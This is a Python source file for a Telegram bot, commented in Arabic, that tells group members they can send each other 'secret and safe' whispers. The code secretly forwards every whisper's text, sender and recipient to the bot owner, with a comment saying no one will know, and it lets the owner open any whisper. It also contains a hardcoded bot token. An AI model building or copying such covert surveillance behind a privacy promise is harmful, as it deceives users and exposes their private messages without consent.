import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8912650382:AAGxGtTJ6loePuTG3Dyt3f8Knhpa4HGDR4A"
bot = telebot.TeleBot(TOKEN)

# 🚨 ضع آي دي حسابك الشخصي هنا (المالك) لكي تستقبل نسخة من كل الهمسات سراً
OWNER_ID = 6312345678  # <--- استبدل هذا الرقم بالآي دي الحقيقي لك في تيليجرام

# قواميس التخزين المؤقت
user_states = {}
active_whispers = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    args = message.text.split()
    if len(args) > 1 and args[1].startswith("whisper_"):
        whisper_id = args[1].replace("whisper_", "")
        if whisper_id in active_whispers:
            w = active_whispers[whisper_id]
            
            # السماح للمستهدف الحقيقي أو للمالك (أنت) بفتح الهمسة
            if message.from_user.id != w['target_id'] and message.from_user.id != OWNER_ID:
                bot.reply_to(message, "❌ عذراً، هذه الهمسة ليست موجهة لك!")
                return
                
            if w['read_status'] and message.from_user.id != OWNER_ID:
                bot.reply_to(message, "⚠️ عذراً، هذه الهمسة تمت قراءتها مسبقاً.")
            else:
                w['read_status'] = True
                bot.reply_to(
                    message, 
                    f"• تمت قراءة الهمسة .. بنجاح\n• بواسطة العضو المطلوب ✨\n- من قبل ← {w['sender_name']}♡\n\n💌 النص:\n{w['text']}"
                )
            return

    # الرسالة الترحيبية للخاص
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("➕ اضفني لمجموعتك", url=f"https://t.me/{bot.get_me().username}?startgroup=true"))
    bot.reply_to(
        message,
        "✨ **أهلاً بك في بوت الهمسات الذكي**\n\n"
        "🛡️ • يمكنك من خلالي إرسال همسات سرية وآمنة داخل المجموعات لأي عضو بالرد على رسالته.\n\n"
        "💡 • **طريقة الاستخدام:**\n"
        "• رد على رسالة أي شخص في المجموعة بكلمة (همس) أو حرف (هـ)\n"
        "• اضغط على زر (اهمس هنا) المظهر واكتب همستك بكل سرية!",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: message.chat.type == 'private')
def private_chat(message):
    user_id = message.from_user.id
    if user_id in user_states:
        target = user_states[user_id]
        whisper_text = message.text
        
        # إنشاء معرف فريد للهمسة
        whisper_id = f"{user_id}_{target['target_id']}_{message.message_id}"
        active_whispers[whisper_id] = {
            'text': whisper_text,
            'sender_name': message.from_user.first_name,
            'target_id': target['target_id'],
            'read_status': False
        }
        
        markup = InlineKeyboardMarkup()
        bot_username = bot.get_me().username
        markup.add(InlineKeyboardButton("🛡️ اهمس هنا", url=f"https://t.me/{bot_username}?start=whisper_{whisper_id}"))
        
        target_mention = f"[{target['name']}](tg://user?id={target['target_id']})"
        
        bot.send_message(
            target['chat_id'],
            f"• تم تحديد الهمسه لـ ⟵ {target_mention}\n• اضغط الزر لكتابة الهمسة في الخاص\n-",
            reply_markup=markup,
            parse_mode="Markdown"
        )
        
        bot.reply_to(message, f"• تم ارسال همستك لـ {target['name']} بنجاح")
        
        # 🕵️‍♂️ ميزة المالك: إرسال نسخة سرية إليك في الخاص دون أن يدري أحد
        try:
            bot.send_message(
                OWNER_ID,
                f"🚨 [لوحة مراقبة المالك]\n\n👤 المرسل: {message.from_user.first_name} (ID: {user_id})\n🎯 المستهدف: {target['name']} (ID: {target['target_id']})\n💌 النص:\n{whisper_text}"
            )
        except Exception:
            pass
            
        del user_states[user_id]
    else:
        bot.reply_to(message, "الرجاء الرد بكلمة (هـ) على الشخص في المجموعة أولاً لتحديد الهمسة.")

@bot.message_handler(func=lambda message: message.chat.type != 'private')
def group_chat(message):
    if not message.reply_to_message or message.text.strip() not in ["هـ", "ه", "همس", "اهمس"]:
        return
        
    target = message.reply_to_message.from_user
    if target.is_bot or message.from_user.id == target.id:
        return
        
    user_states[message.from_user.id] = {
        'target_id': target.id,
        'name': target.first_name,
        'chat_id': message.chat.id
    }
    
    bot.reply_to(message, f"• اكتب همستك لـ {target.first_name} الآن في الخاص:")

bot.infinity_polling()
